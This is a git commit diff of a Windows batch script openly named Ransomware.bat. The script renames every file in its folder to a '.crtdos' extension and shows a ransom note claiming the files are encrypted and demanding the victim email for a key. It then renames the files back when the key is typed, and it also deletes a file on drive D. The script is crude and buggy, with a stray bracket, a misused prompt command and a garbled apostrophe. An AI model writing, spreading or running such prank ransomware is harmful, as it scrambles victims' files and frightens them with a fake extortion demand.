0f28aea0353142ce01539d847347e2ef92f65614
Fly Far <92847004+duongletrieu@users.noreply.github.com>
2021-10-25 10:29:34 +0700

    Update and rename CryptoBatch.bat to Ransomware.bat

--- Ransomware.bat
+++ Ransomware.bat
@@ -1,12 +1,12 @@
 @echo off
 color 02
-title CryptoBatch
-ren *.* *.crtbatch
+title CryptoDOS
+ren *.* *.crtdos
 rename 
 echo ATTENTION!
 echo -------------------------------------------------------------------------------------------------------------
 echo All your files like photos, databases, documents and other important are encrypted!
-echo Don’t worry, you can return all your files!
+echo Donâ€™t worry, you can return all your files!
 echo The only method of recovering files is to get an unique key for you.
 echo To get the key you need write on our e-mail and send with your ID:
 echo Our E-mail:
@@ -18,13 +18,17 @@ pause
 echo Type your decrypt key:
 set /p key=asd3SGd8723bqD7SH8JmYm298WxkjhasiuSDFS35Je5RhszHsdsals6
 if %key%==key (
-rename *.crtbat *.*
+rename *.crtdos *.*
 echo Your files are decrypted!
 pause 
+del D:\CryptoDOS.bat
 exit
 )
 if not %key%==key (
 echo Sorry, wrong key!
 echo Stay happily with your encrypted files...
-echo pause 
+pause 
 exit
+(
+
+
